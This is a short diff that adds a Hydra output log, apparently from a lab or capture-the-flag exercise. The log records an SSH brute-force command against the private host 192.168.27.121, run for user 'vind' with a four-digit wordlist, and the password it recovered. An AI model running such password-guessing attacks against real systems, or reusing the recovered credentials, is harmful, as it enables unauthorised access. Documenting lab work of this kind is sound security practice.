@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-05-02 13:20:19 on 192.168.27.121 ssh (hydra -l vind -P four_digit_combinations.txt -t 4 -V -o hydra_output.txt ssh://192.168.27.121)
+[22][ssh] host: 192.168.27.121   login: vind   password: 0020
